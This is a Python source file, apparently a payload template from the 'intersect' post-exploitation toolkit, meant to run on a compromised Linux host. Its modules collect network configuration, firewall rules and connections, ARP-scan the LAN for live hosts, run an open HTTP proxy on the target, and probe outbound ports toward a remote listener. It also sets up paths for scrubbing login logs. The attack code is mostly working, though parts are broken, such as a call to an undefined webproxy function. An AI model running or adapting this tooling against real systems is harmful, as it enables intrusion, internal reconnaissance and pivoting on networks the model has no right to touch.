#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
	option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
         pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir

  
def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
       if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['network', 'lanmap', 'webproxy', 'egressbuster']
    PORT = 8888
    RHOST = '192.168.1.4'
    RPORT = 4444
    PPORT = 8080
    PKEY = 'KXYRTUX'
# Finds and saves network information such as listening ports, firewall rules, DNS configurations, network interfaces and active connections.
def network():
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    os.mkdir(Temp_Dir+"/network")
    networkdir = (Temp_Dir+"/network")
    os.chdir(networkdir) 

    proc = Popen('netstat --tcp --listening',
         shell=True,
         stdout=PIPE,
         )
    output = proc.communicate()[0]

    file = open("nstat.txt","a")
    for items in output:
        file.write(items),
    file.close() 

    os.system("lsof -nPi > lsof.txt")
    ports = ["nstat.txt","lsof.txt"]
    content = ''
    for f in ports:
        content = content + '\n' + open(f).read()
    open('Connections.txt','wb').write(content)
    os.system("rm nstat.txt lsof.txt")
    if whereis('iptables') is not None:
        os.system("iptables -L -n > iptablesLN.txt") 
        os.system("iptables-save > iptables_save.txt")
    else:
        pass

    os.system("ifconfig -a > ifconfig.txt")


    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
        os.system("hostname -I > IPAddresses.txt")
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
        splitIP = localIP.split('.')
        splitIP[3:] = (['0/24'])
        IPRange = ".".join(splitIP)
        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
        file = open("IPAddresses.txt", "a")
        file.write("External IP Address: " + externalIP)
        file.write("Internal IP Address: " + localIP)
        file.write("Internal IP Range: " + IPRange)
        file.close
   
    os.system("hostname -f > hostname.txt")
   
    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
    content = ''
    for f in netfiles:
        content = content + '\n' + open(f).read()
    open('NetworkInfo.txt','wb').write(content)
    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")

    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
    for x in network:
        if os.path.exists(x) is True:
            shutil.copy2(x, networkdir)
   


# Enumerates live hosts running on the internal network. Captures internal and external IP address. Perform LAN network mapping.
def lanmap():
    # Combine ARP then portscan. Send IPs to list and iterate through for the scan
    # Add service identification via socket for all open ports
    # Add traceroute after finding live hosts. Send all results to graph report.
   
    print("[+] Searching for live hosts...")
    os.mkdir(Temp_Dir+"/hosts")
    os.chdir(Temp_Dir+"/hosts")

    try:
        #TODO:Consider scanning all non-loopback addresses for multi-homed machines
        localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
    except OSError:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
    else:
        pass
    #Get the integer representation of the local IP address
    ipBin = reduce(lambda x, y: (int(x) << 8)+int(y), localIP.split('.'))
    #route = [ network_addr, netmask, gateway, interface, address ]
    for route in scapy.all.conf.route.routes:
        if (route[4] == localIP #If it's the address we're talking to
            and route[0] != 0 #and it's not the route to the gateway itself
            and route[0] == (route[1] & ipBin)): #And localIP is in this subnet (fixes 169.254/16 oddness)
                #Calculate the CIDR from the base-2 logarithm of the netmask
                IPRange = '/'.join((localIP, str(int(32-log(0xffffffff-route[1]+1,2)))))
    
    conf.verb=0
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IPRange),timeout=2)
    file = open("livehosts.txt", "a")
    file.write("LAN IP Range: " + IPRange +"\n")
    for snd,rcv in ans:
        mac_address=rcv.sprintf("%Ether.src%")
        ip_address=rcv.sprintf("%ARP.psrc%")
        #print rcv.sprintf("\n\n[+] Live Host\nMAC %Ether.src%\nIP: %ARP.psrc%\n ")
        file.write("\n[+] Live Host\nIP: "+ip_address + " MAC"+ mac_address + "\n")
    file.write("\n")
    file.close

    externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
    file = open("external.txt", "a")
    file.write("External IP Address: " + externalIP +"\n")
    file.write("Internal IP Address: " + localIP +"\n")
    file.write("Internal IP Range: " + IPRange +"\n")
    file.close
    
 

# Starts an HTTP proxy on the target system
class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.copyfile(urllib2.urlopen(self.path), self.wfile)

def httproxy():
    httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
    print("[+] Serving HTTP proxy on port %s" % PPORT)
    httpd.serve_forever()

# Run an egress buster on the target system to determine available outbound ports. Checks ports 1-1000 by default. You can change this in final script or Modules/Custom/egressbuster
def egressbuster():
    if len(sys.argv) <=2:
        print("[!] Must specify a port-range!")
        sys.exit()

    portrange = sys.argv[2]
    portrange = portrange.split("-")
    lowport = int(portrange[0])
    highport = int(portrange[1])        
    base_port = int(lowport)-1
    end_port = int(highport)

    print "Sending packets to egress listener..."

    while 1:
        base_port = base_port + 1
        thread.start_new_thread(start_socket, (RHOST,base_port))

        time.sleep(0.02)
        
        if base_port == end_port:
                break

    print "All packets have been sent"


def start_socket(RHOST,base_port):
    try:  
        sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockobj.connect((RHOST, base_port))
        sockobj.send(str(base_port))
        sockobj.close()
    except Exception, e:
        print e
        # pass through, ports closed
        pass




def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('     -n   --network')
    print('     -l   --lanmap')
    print('     -w   --webproxy')
    print('     -e   --egressbuster')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'nlwe', ['network', 'lanmap', 'webproxy', 'egressbuster', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-n', '--network'):
            network()
        elif o in ('-l', '--lanmap'):
            lanmap()
        elif o in ('-w', '--webproxy'):
            webproxy()
        elif o in ('-e', '--egressbuster'):
            egressbuster()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])